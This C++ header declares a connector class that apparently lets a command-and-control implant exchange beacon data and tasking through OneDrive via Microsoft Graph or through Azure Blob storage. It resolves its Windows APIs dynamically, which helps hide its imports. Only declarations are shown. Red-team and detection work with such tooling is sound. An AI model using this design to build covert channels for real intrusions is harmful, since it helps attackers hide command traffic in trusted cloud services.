#pragma once

#include <windows.h>
#include <winhttp.h>
#include "Connector.h"

#define STORAGE_ONEDRIVE 0
#define STORAGE_BLOB     1

#ifndef PROFILE_GRAPH_STRUCT
#define PROFILE_GRAPH_STRUCT

typedef struct {
	ULONG storage_type;
	BYTE* tenant_id;
	BYTE* client_id;
	BYTE* client_secret;
	BYTE* user_id;
	BYTE* folder_path;
	BYTE* storage_account;
	BYTE* container_name;
	BYTE* sas_token;
	ULONG poll_attempts;
	ULONG poll_interval_ms;
} ProfileGraph;

#endif

#define DECL_API(x) decltype(x) * x

struct GRAPHFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);
	DECL_API(Sleep);
	DECL_API(GetTickCount);

	DECL_API(WinHttpOpen);
	DECL_API(WinHttpConnect);
	DECL_API(WinHttpOpenRequest);
	DECL_API(WinHttpSendRequest);
	DECL_API(WinHttpReceiveResponse);
	DECL_API(WinHttpQueryDataAvailable);
	DECL_API(WinHttpReadData);
	DECL_API(WinHttpWriteData);
	DECL_API(WinHttpCloseHandle);
	DECL_API(WinHttpSetOption);
	DECL_API(WinHttpQueryHeaders);
	DECL_API(WinHttpAddRequestHeaders);
	DECL_API(WinHttpCrackUrl);
};

class ConnectorGraph : public Connector
{
	ULONG storageType   = STORAGE_ONEDRIVE;

	BYTE* tenant_id     = NULL;
	BYTE* client_id     = NULL;
	BYTE* client_secret = NULL;
	BYTE* user_id       = NULL;
	BYTE* folder_path   = NULL;

	BYTE* storageAccount = NULL;
	BYTE* containerName  = NULL;
	BYTE* sasToken       = NULL;

	BYTE* beatData      = NULL;
	ULONG beatSize      = 0;

	BYTE* recvData      = NULL;
	int   recvSize      = 0;

	BYTE* accessToken   = NULL;
	ULONG tokenLen      = 0;

	DWORD tokenTimestamp       = 0;
	DWORD tokenRefreshInterval = 2700000;

	ULONG pollAttempts   = 15;
	ULONG pollIntervalMs = 3000;

	GRAPHFUNC* functions = NULL;

public:
	ConnectorGraph();

	BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
	void CloseConnector() override;

	BYTE* RecvData() override;
	int   RecvSize() override;
	void  RecvClear() override;

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;

private:
	BOOL  RefreshToken();
	BOOL  NeedsTokenRefresh();

	BOOL  UploadFile(CHAR* filename, BYTE* data, ULONG dataSize);
	BYTE* DownloadFile(CHAR* filename, ULONG* outSize);
	BOOL  DeleteRemoteFile(CHAR* filename);

	BOOL  BlobUploadFile(CHAR* filename, BYTE* data, ULONG dataSize);
	BYTE* BlobDownloadFile(CHAR* filename, ULONG* outSize);
	BOOL  BlobDeleteRemoteFile(CHAR* filename);

	BOOL  DoUpload(CHAR* filename, BYTE* data, ULONG dataSize);
	BYTE* DoDownload(CHAR* filename, ULONG* outSize);
	BOOL  DoDelete(CHAR* filename);

	BOOL  DoHttpRequest(WCHAR* host, WORD port, BOOL ssl, WCHAR* verb,
	                    WCHAR* path, BYTE* headers, ULONG headersLen,
	                    BYTE* body, ULONG bodyLen,
	                    BYTE** result, ULONG* outSize, DWORD* statusOut);

	WCHAR* AtoW(CHAR* str);
	void   FreeW(WCHAR* str);
	CHAR*  BuildGraphPath(CHAR* suffix);
	CHAR*  BuildNonce();
	CHAR*  PercentEncode(CHAR* str);
	CHAR*  BuildAuthHeader();
	void   FreeAuthHeader(CHAR* header, ULONG len);

	WCHAR* BuildBlobHost();
	CHAR*  BuildBlobPath(CHAR* filename);
};
